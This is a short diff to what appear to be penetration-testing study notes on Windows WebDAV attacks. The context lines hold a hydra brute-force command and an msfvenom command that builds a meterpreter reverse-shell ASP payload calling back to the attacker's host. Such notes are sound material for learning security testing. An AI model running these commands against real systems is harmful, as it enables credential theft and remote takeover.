@@ -50,6 +50,7 @@ Windows Vulnerabilities
         - cadaver http://<ip>/webdav
     - Hydra can be used to brute force credentials
         - hydra -L <users> -P <passwords> <ip> http-get <path to webdav>
+        
 
 - Exploiting WebDAV with metasploit
     - msfvenom -p windows/meterpreter/reverse_tcp LHOST=<my_ip> LPORT=<port> -f asp > shell.asp
